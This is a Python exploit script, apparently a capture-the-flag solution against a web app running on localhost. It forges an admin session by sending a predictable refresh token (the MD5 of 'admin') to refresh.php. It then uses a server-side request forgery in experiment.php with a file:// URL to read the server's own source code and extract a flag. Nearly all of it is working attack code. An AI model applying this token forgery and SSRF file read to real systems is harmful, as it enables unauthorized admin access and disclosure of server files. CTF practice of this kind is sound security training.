#!/usr/bin/env python3
import hashlib
import requests

BASE_URL = "http://localhost:8000"

def register(username: str, password: str) -> requests.Session:
    """Register a new user and return an authenticated session."""
    session = requests.Session()
    resp = session.post(
        f"{BASE_URL}/register.php",
        data={"username": username, "password": password},
        allow_redirects=True,
    )
    resp.raise_for_status()
    return session


def get_admin_session() -> requests.Session:
    """
    Forge an admin session by sending the known refresh token (md5('admin'))
    directly to /refresh.php, which sets a fresh access_token cookie.
    """
    refresh_token = hashlib.md5(b"admin").hexdigest()

    session = requests.Session()
    session.cookies.set("refresh_token", refresh_token, path="/refresh.php")

    resp = session.post(f"{BASE_URL}/refresh.php")
    resp.raise_for_status()

    return session


def ssrf(session: requests.Session, url: str) -> str:
    """
    POST a URL to experiment.php as an admin and return the raw synthesis log
    output (the curl response body).
    """
    resp = session.post(
        f"{BASE_URL}/experiment.php",
        data={"url": url},
    )
    resp.raise_for_status()

    # The raw curl output sits between the result-pre tags
    marker_open  = '<pre class="result-pre">'
    marker_close = "</pre>"
    start = resp.text.find(marker_open)
    if start == -1:
        raise ValueError("result-pre block not found in response")
    start += len(marker_open)
    end = resp.text.find(marker_close, start)
    return resp.text[start:end]


if __name__ == "__main__":
    # ── Step 1: get an admin session via the forged refresh token ────────────
    admin = get_admin_session()
    print("[+] Admin session obtained")

    # ── Step 2: read experiment.php via SSRF to find flag 1 ─────────────────
    raw = ssrf(admin, "file:///var/www/html/experiment.php")
    print("[+] experiment.php source code obtained")
    print(f"[+] Flag: {raw.splitlines()[1][3:]}")


